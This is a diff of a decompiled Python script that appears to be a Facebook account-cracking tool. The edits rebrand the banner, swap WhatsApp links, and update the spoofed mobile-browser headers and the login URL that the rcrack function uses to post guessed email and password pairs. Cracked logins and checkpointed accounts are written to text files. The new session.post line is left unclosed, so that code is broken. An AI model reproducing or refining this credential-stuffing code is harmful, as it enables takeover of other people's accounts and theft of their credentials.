@@ -2,7 +2,7 @@
 # Time Succes decompile : 2023-02-07 00:26:14.084668
 from os import path
 import os,base64,zlib,pip,urllib
-os.system('xdg-open http://wa.me/+93764943352')
+os.system('xdg-open http://wa.me/https://chat.whatsapp.com/CCIWb0UjZyS82dp30m1Jf2 ')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
@@ -134,9 +134,9 @@ logo=("""
 
 
 \33[1;37m----------------------------------------------
-→   Owner              : AFG HKR MAFIA KING 💪
+→   Owner              :ESA AFG HKR MAFIA KING 💪
 →   Facebook          :  MUSLIM AFGHAN
-→   Github            :  king HKR
+→   Github            : ESA king HKR
     Tools             :free
 \x1b[1;97m→       Version    :    0.2
 4G/3G full speed internet 💔Update Coming Soon
@@ -179,7 +179,7 @@ def riaz():
 	if riaz1 =='5':
 		riaz()
 	if riaz1 =='4':
-		os.system('xdg-open http://wa.me/+93764943352?text=SN.JAN💜🐰Sir😪💕')
+		os.system('xdg-open http://wa.me/https://chat.whatsapp.com/CCIWb0UjZyS82dp30m1Jf2 ?text=SN.JAN💜🐰Sir😪💕')
 	if riaz1 =='3':
 		os.system('https://www.facebook.com/profile.php?id=100015534822130');riaz()
 	if riaz1 =='2':
@@ -428,46 +428,42 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'x.facebook.com',
-			'method':'GET',
-			'path':'/?tbua=1',
-			'scheme':'https',
-			'authority': 'm.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'authority': 'm.com',
-            'authority': 'm.facebook.com',
-            'authority': 'm.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent':pro}
-            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            header_freefb =  {
+    'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'referer': 'https://x.facebook.com/login.php?next=https%3A%2F%2Fx.facebook.com%2Fbookmarks%2F&refsrc=deprecated&wtsid=rdr_0j5IGmBpj47wBv4rv&_rdr',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X669D"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
+            lo = session.post('https://x.facebook.com/login/?next=https%3A%2F%2Fx.facebook.com%2Fbookmarks%2F&ref=dbl&fl&login_from_aymh=1&refid=9',
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[😜]-OK] '+cid+'|'+ps+'\033[0;97m')
+                print('\033[1;32m[ESA😜]-OK] '+cid+'|'+ps+'\033[0;97m')
                 open('SN.AFG HKR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[ HKR😓]-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                print('\033[1;31m[ESA HKR😓]-CP] '+uid+' | '+ps+'\x1b[1;97m')
                 open('SN.AFG HKR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
